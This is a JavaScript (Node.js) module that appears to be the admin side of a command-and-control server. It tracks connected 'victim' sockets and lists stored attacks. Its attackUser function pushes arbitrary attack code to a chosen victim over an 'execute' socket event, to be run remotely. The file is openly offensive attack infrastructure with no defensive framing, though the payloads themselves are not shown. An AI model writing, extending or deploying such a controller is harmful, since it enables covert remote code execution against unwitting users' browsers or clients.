const socketio = require('socket.io');
const victimSockets = require('../victim/sockets');
const server = require('../../server');
const attack = require('../../db/controllers/attack');

module.exports.listen = function (app) {
  let io = socketio.listen(app);

  io.on('connection', function (socket) {

    console.log('admin connected');

    socket.join('admins');

    module.exports.emit = function (eventName, data) {
      io.to('admins').emit(eventName, data);
    };
    
    socket.on('getUsers', module.exports.getUsers);

    socket.on('getAttacks', module.exports.getAttacks);

    socket.on('disconnect', module.exports.disconnect);

    socket.on('attackUser', module.exports.attackUser);

  });

  return io;
};

module.exports.getUsers = function () {
  victimSockets.sockets.forEach(function(user){
    module.exports.emit('newUser', user);
  });
};

module.exports.getAttacks = function () {
  attack.findAll((attacks)=>{
    module.exports.emit('attacks', attacks);
  })
};

module.exports.disconnect = function () {
  console.log('admin disconnected');
};

module.exports.attackUser = function (data) {
  // console.log("received instructions to use attack " + data.attack + " on " + data.userSocket);
  server.ioVictim.to(data.userSocket).emit('execute', {
    func: `var attack = ${data.attack.toString()}`,
    inputs: data.inputs
  });
};

module.exports.emit = ()=>{
  //need to define the emit function to prevent errors when a victim connects before an admin
  console.log('No admins connected')
}